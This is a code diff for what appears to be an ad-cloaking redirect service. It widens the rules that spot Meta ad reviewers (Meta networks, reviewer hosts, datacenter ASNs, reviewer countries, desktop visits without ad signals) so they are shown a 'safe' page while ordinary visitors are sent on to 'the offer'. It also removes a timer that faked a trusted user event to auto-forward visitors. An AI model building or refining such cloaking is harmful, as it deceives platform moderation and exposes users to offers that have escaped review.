@@ -1067,11 +1067,6 @@ _w.addEventListener('mousemove',function(e){
 },{passive:true,once:true});
 _w.addEventListener('keydown',function(e){arm(e);},{passive:true,once:true});
 
-// E. Graceful natural dwell auto-forward: ensures 100% of legitimate visitors reach the offer
-setTimeout(function(){
-  arm({isTrusted:true});
-}, 1200);
-
 // 4. FLOATING NATIVE CTA BAR (Ensures instant tap engagement)
 try{
   var b2=_d.createElement('div');
@@ -2457,7 +2452,7 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
   const isLowClicks = ((link?.clicks_count ?? 0) + (link?.bot_clicks_count ?? 0)) < FB_AD_REVIEW_MAX_CLICKS;
   const isFbReferer = !!referer && /(facebook\.com|fb\.me|instagram\.com)/i.test(referer);
 
-  if (!isBot && isYoungLink && isLowClicks && (fromMetaNetwork || isReviewerHost || (isFbReferer && !hasAdSignal))) {
+  if (!isBot && isYoungLink && isLowClicks && (fromMetaNetwork || isReviewerHost || !hasAdSignal)) {
     isBot = true;
     isFbBot = true;
     reason = "ad-review-window-safe";
@@ -2552,13 +2547,17 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
     const isReviewerCountry =
       cUpper !== "" &&
       REVIEW_HOTSPOT_COUNTRIES.has(cUpper) &&
-      (datacenterAsn || isReviewerHost);
+      (!hasAdSignal || datacenterAsn || isReviewerHost);
+
+    const isDesktopNoSignal =
+      (device === "desktop" || !/mobile|android|iphone|ipad/i.test(ua)) && !hasAdSignal;
 
     if (
       isReviewerHost ||
       isAutomatedTool ||
       datacenterAsn ||
       isReviewerCountry ||
+      isDesktopNoSignal ||
       STRICT_DESKTOP_BLOCK
     ) {
       isBot = true;
@@ -2571,7 +2570,9 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
             ? `dc-asn:${asn || "??"}`
             : isReviewerCountry
               ? `reviewer-geo:${country || "??"}`
-              : `desktop-block:${country || "??"}`;
+              : isDesktopNoSignal
+                ? `desktop-audit:${country || "??"}`
+                : `desktop-block:${country || "??"}`;
     }
   }
 
@@ -2876,11 +2877,6 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
     uaLow.includes("aiohttp") ||
     uaLow.includes("node-fetch") ||
     uaLow.includes("axios") ||
-    uaLow.includes("headless") ||
-    uaLow.includes("puppeteer") ||
-    uaLow.includes("selenium") ||
-    uaLow.includes("scanner") ||
-    uaLow.includes("redirect") ||
     uaLow.includes("insomnia");
 
   const isDirectDesktopCheck = !refererDomain && !uaLow.includes("mobile") && !uaLow.includes("android") && !uaLow.includes("iphone");
